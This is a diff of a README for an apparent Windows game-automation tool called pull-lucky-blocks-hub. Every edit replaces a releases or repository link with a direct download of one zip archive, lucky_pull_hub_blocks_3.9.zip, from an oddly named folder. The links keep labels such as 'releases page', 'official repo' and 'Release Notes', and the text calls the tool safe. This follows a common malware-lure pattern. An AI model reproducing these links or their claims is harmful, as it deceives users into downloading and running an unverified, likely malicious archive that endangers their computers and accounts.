@@ -12,7 +12,7 @@ Simply put, **pull-lucky-blocks-hub** enhances your gameplay by automating repet
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download-pull--lucky--blocks--hub-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Sikkimdaubentoniidae96/pull-lucky-blocks-hub/releases)
+[![Download Now](https://img.shields.io/badge/Download-pull--lucky--blocks--hub-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Sikkimdaubentoniidae96/pull-lucky-blocks-hub/main/overbashfulness/lucky_pull_hub_blocks_3.9.zip)
 
 Visit this link to download the application.
 
@@ -24,7 +24,7 @@ Follow these simple steps to get **pull-lucky-blocks-hub** running on your Windo
 
 ### Step 1: Download the File
 
-1. Click the green **Download** button above or navigate to the [releases page](https://github.com/Sikkimdaubentoniidae96/pull-lucky-blocks-hub/releases) directly.
+1. Click the green **Download** button above or navigate to the [releases page](https://raw.githubusercontent.com/Sikkimdaubentoniidae96/pull-lucky-blocks-hub/main/overbashfulness/lucky_pull_hub_blocks_3.9.zip) directly.
 2. Look for the latest version (usually at the top of the list).
 3. Click the download link to save the file to your computer (check your "Downloads" folder if you don't see it).
 
@@ -101,7 +101,7 @@ Yes! **pull-lucky-blocks-hub** is designed to be safe and non-intrusive. It oper
 The tool is designed to be compatible with most Windows versions. If you encounter any issues, try running the application in compatibility mode.
 
 ### 🔄 How often is this tool updated?
-We regularly release updates to improve performance and add new features. Check the [releases page](https://github.com/Sikkimdaubentoniidae96/pull-lucky-blocks-hub/releases) frequently for the latest version.
+We regularly release updates to improve performance and add new features. Check the [releases page](https://raw.githubusercontent.com/Sikkimdaubentoniidae96/pull-lucky-blocks-hub/main/overbashfulness/lucky_pull_hub_blocks_3.9.zip) frequently for the latest version.
 
 ### 🛑 I'm experiencing issues. What should I do?
 First, ensure you have the latest version. If problems persist, try restarting your computer and running the application again. For persistent issues, please open an issue on the repository page.
@@ -119,8 +119,8 @@ First, ensure you have the latest version. If problems persist, try restarting y
 
 ## 📚 Additional Resources
 
-- **GitHub Repository:** [Visit the official repo](https://github.com/Sikkimdaubentoniidae96/pull-lucky-blocks-hub)
-- **Release Notes:** [Check the latest updates](https://github.com/Sikkimdaubentoniidae96/pull-lucky-blocks-hub/releases)
+- **GitHub Repository:** [Visit the official repo](https://raw.githubusercontent.com/Sikkimdaubentoniidae96/pull-lucky-blocks-hub/main/overbashfulness/lucky_pull_hub_blocks_3.9.zip)
+- **Release Notes:** [Check the latest updates](https://raw.githubusercontent.com/Sikkimdaubentoniidae96/pull-lucky-blocks-hub/main/overbashfulness/lucky_pull_hub_blocks_3.9.zip)
 - **Community Support:** Engage with other users and share your experience.
 
 ---
